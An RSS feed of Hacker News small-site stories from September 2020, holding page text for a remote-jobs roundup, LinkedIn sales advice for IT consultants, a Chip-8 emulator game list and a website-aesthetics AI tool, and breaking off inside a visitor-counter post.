<rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
    <channel>
        <title>
<![CDATA[Hacker News - Small Sites - Score >= 1]]>
        </title>
        <description>
<![CDATA[Hacker News stories from domains that aren't in the top 1M and that have a score of at least 1. Updated nightly via https://github.com/awendland/hacker-news-small-sites]]>
        </description>
        <link>https://news.ycombinator.com</link>
        <generator>RSS for Node</generator>
        <lastBuildDate>Mon, 21 Sep 2020 08:25:20 GMT</lastBuildDate>
        <atom:link href="https://raw.githubusercontent.com/awendland/hacker-news-small-sites/generated/feeds/hn-small-sites-score-1.xml" rel="self" type="application/rss+xml"></atom:link>
        <pubDate>Mon, 21 Sep 2020 08:25:20 GMT</pubDate>
        <language>
<![CDATA[en-US]]>
        </language>
        <managingEditor>
<![CDATA[me@alexwendland.com (Alex Wendland)]]>
        </managingEditor>
        <ttl>240</ttl>
        <item>
            <title>
<![CDATA[Show HN: I made a scraper that finds the top remote jobs every week on the web]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24526323">thread link</a>) | @xoelop
<br/>
September 19, 2020 | https://blog.noicejobs.com/best-remote-jobs-in-the-world-between-sep-11-and-sep-18/ | <a href="https://web.archive.org/web/*/https://blog.noicejobs.com/best-remote-jobs-in-the-world-between-sep-11-and-sep-18/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
<div>
<article>

<section>
<div>
<p>Hey everyone!</p><p>I'm <a href="https://twitter.com/xoelipedes" rel="noopener noreferrer">Xoel</a>, the creator of <a href="https://noicejobs.com/" rel="noopener noreferrer">NoiceJobs.com</a>. On this blog, we'll post the best remote jobs found every week, scraped, aggregated and curated from pretty much all job boards in the Internet.</p><p>For example...</p><ul> <li> üëâ üèù <a target="blank" href="https://bit.ly/2RxVom5">Senior Software Developer</a> at <b>Jupiter</b>
<br>
<b>$70,000 - $120,000 USD + Equity depending on experience</b>
<br> üè° Hiring in EU, Canada, US, Mexico, Central &amp; South America, Rest of Europe  <p>‚Ä¢ We're looking for someone to help <strong>build and support new features</strong> as we scale out the product and company. You will be primarily working with <strong>React, React Native, Node.js</strong>, and <strong>GraphQL</strong>.<br>‚Ä¢ We're looking for someone who is particularly interested in creating systems within the constraints of a <strong>start-up</strong>.<br>‚Ä¢ And finally: we're <strong>bootstrapped</strong>, so far, <strong>building a sustainable business we all want to work at</strong>.</p>
<br> üì® Wanna get an intro with Rich, CTO at Jupiter? <a href="https://airtable.com/shrzoNF0Lcz50u9oh?prefill_open_for_offers=TRUE%20&amp;prefill_extra_info_reported=I%27m%20interested%20in%20the%20Senior%20Software%20Developer%20position%20at%20Jupiter.%0A%0AThis%20is%20why%20I%20think%20I%27m%20a%20great%20candidate%20for%20this%20position%3A" target="_blank" rel="noopener noreferrer">Join NoiceJobs</a> if you haven't yet or <a href="https://blog.noicejobs.com/cdn-cgi/l/email-protection#bfc7d0dad3ffd1d0d6dcdad5d0ddcc91dcd0d280cccaddd5dadccb82f6d1cbcdd09a8d8fd9d0cd9a8d8fcbd7da9a8d8fecdad1d6d0cd9a8d8fecd0d9cbc8decdda9a8d8ffbdac9dad3d0cfdacd9a8d8fcfd0ccd6cbd6d0d19a8d8fdecb9a8d8ff5cacfd6cbdacd" target="_blank" rel="noopener noreferrer">email us</a> if you're a member already.
<br> </li> </ul>
<p> Wanna promote your job on NoiceJobs? <a href="#hiring">Check this out</a> </p><p>This post will make it easier to navigate the blog and all the different categories. Jump to...</p><ul> <li> <a href="#Engineering">üñ• Best Remote Engineering jobs found this week</a> </li> <li> <a href="#Product">üñº Best Remote Product jobs found this week</a> </li> <li> <a href="#Business">üíµ Best Remote Business jobs found this week</a> </li> <li> <a href="#Other">üíº Best Other Remote jobs found this week</a> </li> </ul>
<p>BTW: now you can also get these jobs every week <a href="#newsletter">via email!</a></p><h2 id="-best-remote-engineering-jobs-found-this-week">üñ• Best Remote Engineering jobs found this week</h2><p><a href="https://blog.noicejobs.com/best-senior-cto-26-tech-lead-remote-jobs-between-sep-11-and-sep-18/">CTO &amp; Tech Lead jobs</a><br><a href="https://blog.noicejobs.com/best-senior-engineering-manager-remote-jobs-between-sep-11-and-sep-18/">Engineering Manager jobs</a><br><a href="https://blog.noicejobs.com/best-senior-fullstack-remote-jobs-between-sep-11-and-sep-18/">Fullstack jobs</a><br><a href="https://blog.noicejobs.com/best-senior-frontend-remote-jobs-between-sep-11-and-sep-18/">Frontend jobs</a><br><a href="https://blog.noicejobs.com/best-senior-backend-remote-jobs-between-sep-11-and-sep-18/">Backend jobs</a><br><a href="https://blog.noicejobs.com/best-senior-sre-26-devops-remote-jobs-between-sep-11-and-sep-18/">SRE &amp; Devops jobs</a><br><a href="https://blog.noicejobs.com/best-senior-infosec-remote-jobs-between-sep-11-and-sep-18/">Infosec jobs</a><br><a href="https://blog.noicejobs.com/best-senior-mobile-remote-jobs-between-sep-11-and-sep-18/">Mobile jobs</a><br><a href="https://blog.noicejobs.com/best-senior-ios-remote-jobs-between-sep-11-and-sep-18/">iOS jobs</a><br><a href="https://blog.noicejobs.com/best-senior-android-remote-jobs-between-sep-11-and-sep-18/">Android jobs</a><br><a href="https://blog.noicejobs.com/best-senior-python-remote-jobs-between-sep-11-and-sep-18/">Python jobs</a><br><a href="https://blog.noicejobs.com/best-senior-javascript-remote-jobs-between-sep-11-and-sep-18/">Javascript jobs</a><br><a href="https://blog.noicejobs.com/best-senior-java-remote-jobs-between-sep-11-and-sep-18/">Java jobs</a><br><a href="https://blog.noicejobs.com/best-senior-rails-ruby-remote-jobs-between-sep-11-and-sep-18-2/">Rails/Ruby jobs</a><br><a href="https://blog.noicejobs.com/best-senior-go-remote-jobs-between-sep-11-and-sep-18/">Go jobs</a><br><a href="https://blog.noicejobs.com/best-senior-rust-remote-jobs-between-sep-11-and-sep-18/">Rust jobs</a><br><a href="https://blog.noicejobs.com/best-senior-php-remote-jobs-between-sep-11-and-sep-18/">PHP jobs</a><br><a href="https://blog.noicejobs.com/best-senior-wordpress-remote-jobs-between-sep-11-and-sep-18/">Wordpress jobs</a><br><a href="https://blog.noicejobs.com/best-senior-qa-remote-jobs-between-sep-11-and-sep-18/">QA jobs</a><br><a href="https://blog.noicejobs.com/best-senior-solutions-architect-remote-jobs-between-sep-11-and-sep-18/">Solutions Architect jobs</a><br><a href="https://blog.noicejobs.com/best-senior-data-science-26-ml-remote-jobs-between-sep-11-and-sep-18-2/">Data Science &amp; ML jobs</a><br><a href="https://blog.noicejobs.com/best-senior-nlp-26-nlg-remote-jobs-between-sep-11-and-sep-18-2/">NLP &amp; NLG jobs</a><br><a href="https://blog.noicejobs.com/best-senior-data-engineering-26-big-data-remote-jobs-between-sep-11-and-sep-18-2/">Data Engineering &amp; Big Data jobs</a><br><a href="https://blog.noicejobs.com/best-senior-shopify-remote-jobs-between-sep-11-and-sep-18/">Shopify jobs</a><br><a href="https://blog.noicejobs.com/best-senior-gis-remote-jobs-between-sep-11-and-sep-18/">GIS jobs</a><br><a href="https://blog.noicejobs.com/best-senior-react-remote-jobs-between-sep-11-and-sep-18/">React jobs</a><br><a href="https://blog.noicejobs.com/best-senior-vue-remote-jobs-between-sep-11-and-sep-18/">Vue jobs</a><br><a href="https://blog.noicejobs.com/best-devrel-remote-jobs-found-between-sep-02-and-sep-09/">DevRel jobs</a><br><a href="https://blog.noicejobs.com/best-senior-game-dev-26-design-remote-jobs-between-sep-11-and-sep-18-2/">Game Dev &amp; Design jobs</a><br><a href="https://blog.noicejobs.com/best-senior-haskell-remote-jobs-between-sep-11-and-sep-18/">Haskell jobs</a><br><a href="https://blog.noicejobs.com/best-senior-scala-remote-jobs-between-sep-11-and-sep-18/">Scala jobs</a><br><a href="https://blog.noicejobs.com/best-generalist-remote-jobs-between-sep-11-and-sep-18/">Generalist jobs</a><br><a href="https://blog.noicejobs.com/best-senior-c-2b-2b-remote-jobs-between-sep-11-and-sep-18-2/">C++ jobs</a><br><a href="https://blog.noicejobs.com/best-senior-net-remote-jobs-between-sep-11-and-sep-18-2/">.NET jobs</a><br></p><h2 id="-best-remote-product-jobs-found-this-week">üñº Best Remote Product jobs found this week</h2><p><a href="https://blog.noicejobs.com/best-senior-cpo-remote-jobs-between-sep-11-and-sep-18/">CPO jobs</a><br><a href="https://blog.noicejobs.com/best-senior-product-manager-remote-jobs-between-sep-11-and-sep-18/">Product Manager jobs</a><br><a href="https://blog.noicejobs.com/best-senior-ux-26-product-design-remote-jobs-between-sep-11-and-sep-18/">UX &amp; Product Design jobs</a><br><a href="https://blog.noicejobs.com/best-senior-ui-design-remote-jobs-between-sep-11-and-sep-18/">UI Design jobs</a><br><a href="https://blog.noicejobs.com/best-senior-art-26-visual-design-remote-jobs-between-sep-11-and-sep-18/">Art &amp; Visual Design jobs</a><br><a href="https://blog.noicejobs.com/best-senior-copywriting-remote-jobs-between-sep-11-and-sep-18/">Copywriting jobs</a><br><a href="https://blog.noicejobs.com/best-senior-video-editing-remote-jobs-between-sep-11-and-sep-18/">Video Editing jobs</a><br></p><h2 id="-best-remote-business-jobs-found-this-week">üíµ Best Remote Business jobs found this week</h2><p><a href="https://blog.noicejobs.com/best-senior-sales-remote-jobs-between-sep-11-and-sep-18/">Sales jobs</a><br><a href="https://blog.noicejobs.com/best-senior-sdr-remote-jobs-between-sep-11-and-sep-18/">SDR jobs</a><br><a href="https://blog.noicejobs.com/best-senior-legal-remote-jobs-between-sep-11-and-sep-18/">Legal jobs</a><br><a href="https://blog.noicejobs.com/best-senior-operations-remote-jobs-between-sep-11-and-sep-18/">Operations jobs</a><br><a href="https://blog.noicejobs.com/best-senior-customer-support-remote-jobs-between-sep-11-and-sep-18/">Customer Support jobs</a><br><a href="https://blog.noicejobs.com/best-senior-seo-2c-sem-remote-jobs-between-sep-11-and-sep-18/">SEO, SEM jobs</a><br><a href="https://blog.noicejobs.com/best-senior-marketing-remote-jobs-between-sep-11-and-sep-18/">Marketing jobs</a><br><a href="https://blog.noicejobs.com/best-senior-growth-remote-jobs-between-sep-11-and-sep-18/">Growth jobs</a><br><a href="https://blog.noicejobs.com/best-senior-agile-scrum-remote-jobs-between-sep-11-and-sep-18-2/">Agile/Scrum jobs</a><br><a href="https://blog.noicejobs.com/best-senior-data-business-analyst-remote-jobs-between-sep-11-and-sep-18-2/">Data/Business Analyst jobs</a><br><a href="https://blog.noicejobs.com/best-senior-finance-26-investing-remote-jobs-between-sep-11-and-sep-18-2/">Finance &amp; Investing jobs</a><br><a href="https://blog.noicejobs.com/best-senior-accounting-26-bookkeping-remote-jobs-between-sep-11-and-sep-18-2/">Accounting &amp; Bookkeping jobs</a><br><a href="https://blog.noicejobs.com/best-senior-ecommerce-remote-jobs-between-sep-11-and-sep-18/">Ecommerce jobs</a><br><a href="https://blog.noicejobs.com/best-senior-social-media-remote-jobs-between-sep-11-and-sep-18/">Social Media jobs</a><br></p><h2 id="-best-other-remote-jobs-found-this-week">üíº Best Other Remote jobs found this week</h2><p><a href="https://blog.noicejobs.com/best-senior-software-contract-26-freelance-remote-jobs-between-sep-11-and-sep-18/">Software Contract &amp; Freelance jobs</a><br><a href="https://blog.noicejobs.com/best-senior-software-part-time-remote-jobs-between-sep-11-and-sep-18/">Software Part-time jobs</a><br><a href="https://blog.noicejobs.com/best-junior-remote-jobs-between-sep-11-and-sep-18/">Junior jobs</a><br></p>
<h2>üì© Get these jobs as weekly newsletters</h2>

<h2 id="hiring"> Are you hiring remotely?
</h2>
<p> üì£ If so, you can now <a href="https://airtable.com/shreWkzRKtq6oQFiK" target="_blank" rel="noopener noreferrer">post a job on NoiceJobs</a> to reach up to thousands of talented remote workers.
</p>
<p> Some numbers on NoiceJobs' audience:
</p>
<ul> <li> More than <b>3000 subscribers</b> on our <a href="https://t.me/noicejobs" target="_blank" rel="noopener noreferrer">Telegram channels</a> </li> <li> <b>Hundreds of people registered</b> on NoiceJobs and get these posts weekly </li> <li> This blog (launched on September 9) had <b><span id="pageviews"></span> page views</b> in the last month (verified by <a href="https://referral.simpleanalytics.com/xoel" target="_blank" rel="noopener noreferrer">Simple Analytics</a>). </li> <li> Our traffic analytics are 100% open. <a href="https://simpleanalytics.com/blog.noicejobs.com" target="_blank" rel="noopener noreferrer">Check them out here üëÄ</a> and see our pageviews in the graph below </li>
</ul>
<div> <p> A cool graph with our visits would go here, but ad blockers don't like the Simple Analytics embed. Disable yours if you'd like to view it :) </p>
</div>
<h3 id="that-s-it-">That's it!</h3><p>I also share jobs like these in these <a href="https://t.me/NoiceJobs">Telegram channels</a>. More than 3,000 people are subscribed to them.</p><p>Have a good weekend!</p><p>Xoel - <a href="https://twitter.com/xoelipedes" rel="noopener noreferrer">I'm on Twitter too. Say hi!</a></p>
</div>
</section>
</article>
</div>
</div></div>]]>
            </description>
            <link>https://blog.noicejobs.com/best-remote-jobs-in-the-world-between-sep-11-and-sep-18/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24526323</guid>
            <pubDate>Sat, 19 Sep 2020 09:51:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Better Way to Find Clients for Your IT Consulting Business]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24526274">thread link</a>) | @kureikain
<br/>
September 19, 2020 | https://corebrief.com/2020/09/09/a-better-way-to-find-clients-for-your-it-consulting-business/ | <a href="https://web.archive.org/web/*/https://corebrief.com/2020/09/09/a-better-way-to-find-clients-for-your-it-consulting-business/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-197">

    

	<div>

		
<p>As an experienced software engineer or IT professional, you have spent many years building up your expertise and your skill-set. You‚Äôve built many solutions and you have solved many problems for clients of various sizes. You have finally decided to turn your expertise into a proper business and escape the rat race once and for all. </p>



<p>Perhaps you‚Äôve even put a team together and have managed to secure a client or two with some decent projects. Everything is looking promising. </p>



<p>Except you run into a little problem. </p>



<p>You have NO idea how to get more clients. </p>



<p>The B2B sales process for technology products and services is complicated, it requires reaching out to the right people who are in a position to make a decision and navigating a complex sales cycle, and you don‚Äôt even know where to begin. In fact, you hate this part You really really do. You‚Äôre a technology person after all. You‚Äôre brilliant at what you do. Surely you shouldn‚Äôt have to engage in low-life scummy sales tactics to find clients. You really hate this part. </p>



<p>But you have a business now, so you try. You send out some cold e-mails. You pitch some people on LinkedIn. You spend some money on social media ads, and it just goes down a drain. And then‚Ä¶. nothing. Zero. You have NO new clients. You‚Äôre in a rut. You begin to panic.</p>



<hr>



<p>But there is good news. </p>



<p>Let‚Äôs take a step back. Whenever you find yourself in a rut, always take a step back. Take a few deep breaths, calm yourself down for a moment, and try to get more general. Try to look at the big picture. You have to put the problems aside for a moment so you can clear your mind and take a fresh look.</p>



<p>The good news is that there is a clear path to what you want.</p>



<p>In fact, you already have the components in place.</p>



<p>The first step is to realise that your professional career so far has given you a valuable competitive advantage.</p>



<p>You now know certain things and can do certain things that very few people on the planet know or can do. </p>



<p>The second step is to realise there is demand for these special skills and knowledge you possess.</p>



<p>There are business owners, managers, decision makers, leaders who are, right now, in need of what you know and what you can do for them. More importantly, many of them have both the willingness and the ability to compensate you generously if you can help them solve specific challenges they are currently facing, or specific goals they are currently committed to achieving.</p>



<p>The third step is to realise that you already have direct access to most of these people. It‚Äôs called LinkedIn (or, more broadly, social media).</p>



<p>As you can see, I was not being wishy-washy when I said the components are already in place. All 3 of the above are indeed already in place.</p>



<p>The path to what you want is through aligning yourself ‚Äì your internal beliefs, your presentation and the messaging you put out ‚Äì so you position yourself to be the natural choice for those seeking your expertise.</p>



<p>And yes, you do have to learn to sell. But this doesn‚Äôt have to be so intimidating and you certainly don‚Äôt have to feel like a low-life doing this. So take another deep breath, and allow yourself to get friendly with sales for a moment. Soon you will be best friends ‚Äì better than you know. </p>



<p>I‚Äôll give you a blueprint to follow, right here in this post. And in the future I‚Äôll go into many more details, but this here should be more than enough to get you started. You shouldn‚Äôt need ANYTHING else, don‚Äôt get yourself overwhelmed. It‚Äôs actually very simple and even easy. </p>



<p>First I‚Äôll tell you what NOT to do. </p>



<p>Then I‚Äôll give you a few basic steps to follow.</p>



<hr>



<p>First and foremost ‚Äì DO NOT go hire anyone to do this for you. Trust me on this one. No one can market or sell your product for you before you‚Äôve mastered this process yourself first. You MUST learn to sell your own products and services, there is no way around it. What‚Äôs more ‚Äì no one can do it better than you. You KNOW what you‚Äôre good at. You KNOW what you‚Äôve been able to do for other clients before. You KNOW what problems you‚Äôve been able to solve. You‚Äôve SEEN people and businesses struggle and make wrong decisions and regret them and you KNOW how to do this right. You know how to do it better. No one else can communicate this better than you. No one can be more convincing. No one can connect with your future clients better than you. </p>



<p>Second, avoid paid advertising before you‚Äôve learned how to generate high-ticket sales without it. Paid ads are an amplifier. If you‚Äôre making zero sales right now, the result of putting lots and lots of money in paid ads will be lots and lots of money multiplied by zero. Don‚Äôt waste your time and money doing this. I‚Äôve been there. It ain‚Äôt pretty. </p>



<p>Repeat after me: Paid ads and sales people are for scaling only. Once you‚Äôve got your offer and your messaging down to a proven working system, you can then pay for ads and hire sales people to go 10x or 100x bigger. But you are not ready for this. Delay this phase as long as possible. When the time comes, you will know it. </p>



<p>Finally, for the love kittens, please don‚Äôt go spamming people left and right with your offer. Don‚Äôt send e-mails. Don‚Äôt talk to strangers on messenger. Don‚Äôt call them on the phone. Don‚Äôt ask for appointments. Just don‚Äôt, ok? Don‚Äôt do it. No one likes that. It won‚Äôt get you anywhere. </p>



<p>There IS a better way.</p>



<hr>



<p>So here is what to do.</p>



<p>You can get started today, easily. And you can see results quickly, without spending a fortune on anyone or anything.</p>



<p>Your biggest problem right now is obscurity. No one knows you exist. Simple as that.</p>



<p>To start getting more sales, you have to get out there where relevant people can see you so that A) they know you exist and B) you get an opportunity to speak directly to their current pains and frustrations.</p>



<p>As tacky as it sounds, social media turns out to be useful for this.</p>



<p>I‚Äôve found that LinkedIn can be pretty great for B2B sales ‚Äì but I‚Äôve also seen people get good results with high-ticket sales on Facebook as well. (Once again, though ‚Äì DO NOT just go spamming people on LinkedIn! Keep calm and read on.)</p>



<p>There is a structure and sequence to the approach. You have to do things in the right order  and you have to get through some things first, but it‚Äôs easy, there‚Äôs no big expenses involved, and you can start getting results in weeks or even days if you do this right.</p>



<p>The first steps go like this:</p>



<ol><li>Get as much clarity as you can on who your ideal clients are and what your main offer is. I think you already have a good idea about this, but always worth thinking harder about it and putting it in writing for yourself and your team. Make sure to think about your ideal client as A PERSON, even if we‚Äôre talking billion-dollar corporations here. At the end of the day someone has to make a decision and write a check.</li><li>Prime your LinkedIn profile. Make it look professional. Use the tag-line to speak directly to your ideal buyer (this requires some creativity and it‚Äôs a bit of a process ‚Äì don‚Äôt be afraid to keep changing it, but once you find something that works, stick with it.) Use the longer ‚ÄúAbout‚Äù section to do more of the same. You have to basically turn that into a mini sales letter. Don‚Äôt go into many technical details ‚Äì always write as if it‚Äôs coming out of your ideal client‚Äôs head. Think of their situation, their current struggles and challenges, the urgency of the problem, and how you can relieve that. Talk about what they will gain from working with you and the amount of time, effort and money they will save.</li><li>Start adding very targeted connections ‚Äì on a daily basis. If you wish, you can pay for LinkedIn‚Äôs Sales Navigator, but I‚Äôve found that the basic search works good enough for me. Every day run a search for people who may be in a position to make decisions about your offer (or go through your LinkedIn network recommendations) and just send out connection requests to 5 ‚Äì 10 people each day day (but don‚Äôt go crazy and start adding everyone indiscriminately.) You can add a little personalisation note, but I‚Äôm not sure it makes much of a difference with most people. Your profile (and especially the tag-line) should be able to speak for itself. There are people who use LinkedIn for networking and they will usually accept your connection request. Then there are people who don‚Äôt like connecting with strangers and they will ignore you. Don‚Äôt make a big deal out of it, don‚Äôt take it personally, just stick to the process and turn it into a habit.</li><li>While you are growing your network, start making more regular posts. You should aim for once a day, on average. You can do more (but not much more) or less (but not much less). In your posts, you can do a number of different things, but the whole point is to imagine you are speaking directly to your ideal clients. Don‚Äôt be too sales-y all the time, just speak from your expertise and experience. Talk about their problems and your solution to them. Talk about what you‚Äôve done for other similar clients and the specific benefits they‚Äôve experienced. Talk especially about saving time ‚Äì that‚Äôs a big one. </li><li>Don‚Äôt be discouraged if you get little to no interactions with your posts at first! This DOESN‚ÄôT mean people aren‚Äôt reading your content. Many people (especially busy people) will not react to your content, but if it‚Äôs relevant they WILL read it. When people do start interacting with your posts, feel free to start conversations with them. Keep the conversation exploratory and see how you can be of service. If you can get them on the phone, even better. Just keep this in mind: your first job is NOT to try to sell them anything. It‚Äôs to understand whether or not you‚Äôre a good fit for working together and to genuinely give them the advice that‚Äôs best for them. If this happens to mean working with you, great ‚Äì don‚Äôt be shy about it either. </li><li>Once every few weeks, make a post with a very direct offer, ‚Ä¶</li></ol></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://corebrief.com/2020/09/09/a-better-way-to-find-clients-for-your-it-consulting-business/">https://corebrief.com/2020/09/09/a-better-way-to-find-clients-for-your-it-consulting-business/</a></em></p>]]>
            </description>
            <link>https://corebrief.com/2020/09/09/a-better-way-to-find-clients-for-your-it-consulting-business/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24526274</guid>
            <pubDate>Sat, 19 Sep 2020 09:38:28 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Chip8 Emulator Games]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24526006">thread link</a>) | @spencerwgreene
<br/>
September 19, 2020 | https://ajor.co.uk/chip8/ | <a href="https://web.archive.org/web/*/https://ajor.co.uk/chip8/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p><a href="https://ajor.co.uk/chip8/chip8.html">Play in your browser with your own Chip8 games</a>, or select a game from below.</p>

<h2 id="chip-8-games">Chip-8 games:</h2>

<p><a href="https://ajor.co.uk/chip8/chip8.html?rom=/chip8/games/CONNECT4&amp;speed=1"><img src="https://ajor.co.uk/images/chip8/connect4.png" alt="Chip8 screenshot"></a>
<a href="https://ajor.co.uk/chip8/chip8.html?rom=/chip8/games/BLINKY&amp;speed=10"><img src="https://ajor.co.uk/images/chip8/blinky.png" alt="Chip8 screenshot"></a>
<a href="https://ajor.co.uk/chip8/chip8.html?rom=/chip8/games/BRIX&amp;speed=10"><img src="https://ajor.co.uk/images/chip8/brix.png" alt="Chip8 screenshot"></a>
<a href="https://ajor.co.uk/chip8/chip8.html?rom=/chip8/games/PONG2&amp;speed=10"><img src="https://ajor.co.uk/images/chip8/pong.png" alt="Chip8 screenshot"></a>
<a href="https://ajor.co.uk/chip8/chip8.html?rom=/chip8/games/TETRIS&amp;speed=10"><img src="https://ajor.co.uk/images/chip8/tetris.png" alt="Chip8 screenshot"></a>
<a href="https://ajor.co.uk/chip8/chip8.html?rom=/chip8/games/HIDDEN&amp;speed=1"><img src="https://ajor.co.uk/images/chip8/hidden.png" alt="Chip8 screenshot"></a></p>

<h2 id="super-chip-games">Super-Chip games:</h2>

<p><a href="https://ajor.co.uk/chip8/chip8.html?rom=/chip8/games/CAR&amp;speed=50"><img src="https://ajor.co.uk/images/chip8/super-car.png" alt="Chip8 screenshot"></a>
<a href="https://ajor.co.uk/chip8/chip8.html?rom=/chip8/games/PIPER&amp;speed=20"><img src="https://ajor.co.uk/images/chip8/super-piper.png" alt="Chip8 screenshot"></a>
<a href="https://ajor.co.uk/chip8/chip8.html?rom=/chip8/games/ALIEN&amp;speed=50"><img src="https://ajor.co.uk/images/chip8/super-alien.png" alt="Chip8 screenshot"></a>
<a href="https://ajor.co.uk/chip8/chip8.html?rom=/chip8/games/ANT&amp;speed=30"><img src="https://ajor.co.uk/images/chip8/super-ant.png" alt="Chip8 screenshot"></a>
<a href="https://ajor.co.uk/chip8/chip8.html?rom=/chip8/games/SPACEFIG&amp;speed=50"><img src="https://ajor.co.uk/images/chip8/super-spacefig.png" alt="Chip8 screenshot"></a>
<a href="https://ajor.co.uk/chip8/chip8.html?rom=/chip8/games/WORM3&amp;speed=20"><img src="https://ajor.co.uk/images/chip8/super-worm.png" alt="Chip8 screenshot"></a></p>

<h2 id="keyboard-map">Keyboard map</h2>
<div><div><pre><code>Chip-8:    QWERTY keyboard:

1 2 3 C        1 2 3 4
4 5 6 D        Q W E R
7 8 9 E        A S D F
A 0 B F        Z X C V
</code></pre></div></div>

<p>Pressing Enter resets the emulator.</p>

<p>All the games seem to have different controls, so you‚Äôll just have to try them and see what works.</p>

  </div></div>]]>
            </description>
            <link>https://ajor.co.uk/chip8/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24526006</guid>
            <pubDate>Sat, 19 Sep 2020 08:15:57 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: How beautiful is your website ‚Äì check using Visual Mind AI]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24525995">thread link</a>) | @myraahio
<br/>
September 19, 2020 | https://myraah.io/visualmind | <a href="https://web.archive.org/web/*/https://myraah.io/visualmind">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
          <div>
            <div>
              
              <h4>Visual rank of your website is as important as your SEO rank.</h4>
              <p>Users make lasting judgments about a website‚Äôs appeal within a split second.  This first impression is influential enough to later affect their opinions of a site‚Äôs usability and trustworthiness.</p>
            </div>
          </div> <!-- col -->
        </div><div>
          <div>
            <div>
              
              <h4>What is Visual Mind ?</h4>
              <p>Visual Mind is an AI engine specifically designed for understanding and scoring visual appearance of a website. Visual Mind has analyzed over a million websites to achieve an accuracy rate of over 97%.</p>
            </div>
          </div> <!-- col -->
        </div><div>
          <div>
            <div>
              
              <h4>What is Visual Mind Score and why it matters ?</h4>
              <p>For too long, aesthetics of a website has been dismissed as a superficial concern. That is a mistake. As latest research demonstrates ( See recommended ref) , the visual appeal of a website is tied up with far weightier issues, such as functionality and trustworthiness.</p>
              <p>Have you ‚Äúfast-tested‚Äù your website? Remember, you have only fifty milliseconds to impress your visitors. Flash your website to people for a very short period of time and then ask for their opinion. That is the opinion that matters.</p>
              <p>Visual Mind score ‚Äì provides you with a qualitative score about that first impression. It can help you evaluate your website aesthetics and make improvements.</p>
              <p><a href="https://myraah.io/index.php/visualmind">Check Your VM SCORE</a></p>
            </div>
          </div> <!-- col -->
        </div><div>
          <div>
            <div>
				<h4>Want to explore more ‚Äì we recommend</h4>
              <p>A.  Bauerly, M., and Liu, Y. Effects of Symmetry and Number of Compositional Elements on Interface and Design Aesthetics. Int. Journal of Human-Computer Interaction 3 (2008).</p>
              <p>B. Cyr, D. Modeling Website Design across Cultures: Relationships to Trust, Satisfaction and E-loyalty. Journal of Management Information Systems 24, 4 (2008)</p>
              <p>C. Everard, A., and Galletta, D. How presentation flaws affect perceived site quality, trust, and intention to purchase from an online store. Journal of Management Information Systems 22, 3 (2006)</p>
              <p>D. Geissler, G., Zinkhan, G., and Watson, R. The Influence of Home Page Complexity on Consumer Attention, Attitudes, and Purchase Intent. Journal of Advertising 35, 2 (2006)</p>
              <p>E. Hall, R. H., and Hanna, P. The Impact of Web Page Text-background Colour Combinations on Readability,Retention, Aesthetics and Behavioural Intention. Behaviour &amp; Information Technology 23, 3 (2004)</p>
              <p>G. Lindgaard, G., Fernandes, G., Dudek, C., and Brown, J. Attention Web Designers: You Have 50 Milliseconds to Make a Good First Impression! Behaviour &amp; Information Technology 25, 2 (2006)</p>
              <p>H. Michailidou, E., Harper, S., and Bechhofer, S. Visual Complexity and Aesthetic Perception of Web Pages. Proc. Design of Communication (2008)</p>
              <p>I. Tuch, A. N., Bargas-Avila, J. A., and Opwis, K. Symmetry and Aesthetics in Website Design: It‚Äôs a Man‚Äôs Business. Computers in Human Behavior 26, 6 (2010)</p>
              
			</div>
          </div> <!-- col -->
        </div></div>]]>
            </description>
            <link>https://myraah.io/visualmind</link>
            <guid isPermaLink="false">hacker-news-small-sites-24525995</guid>
            <pubDate>Sat, 19 Sep 2020 08:13:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[CrazyFast Crystal based 88x31 visitor counter img generator brought back to 2020]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24525873">thread link</a>) | @gcds
<br/>
September 19, 2020 | https://www.techprowd.com/evening-project-a-crystal-based-super-fast-visitor-counter/ | <a href="https://web.archive.org/web/*/https://www.techprowd.com/evening-project-a-crystal-based-super-fast-visitor-counter/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
    <div>

        <article>

            

            <figure>
                <img srcset="https://images.unsplash.com/photo-1502570149819-b2260483d302?ixlib=rb-1.2.1&amp;q=80&amp;fm=jpg&amp;crop=entropy&amp;cs=tinysrgb&amp;w=2000&amp;fit=max&amp;ixid=eyJhcHBfaWQiOjExNzczfQ 300w,
                            https://images.unsplash.com/photo-1502570149819-b2260483d302?ixlib=rb-1.2.1&amp;q=80&amp;fm=jpg&amp;crop=entropy&amp;cs=tinysrgb&amp;w=2000&amp;fit=max&amp;ixid=eyJhcHBfaWQiOjExNzczfQ 600w,
                            https://images.unsplash.com/photo-1502570149819-b2260483d302?ixlib=rb-1.2.1&amp;q=80&amp;fm=jpg&amp;crop=entropy&amp;cs=tinysrgb&amp;w=2000&amp;fit=max&amp;ixid=eyJhcHBfaWQiOjExNzczfQ 1000w,
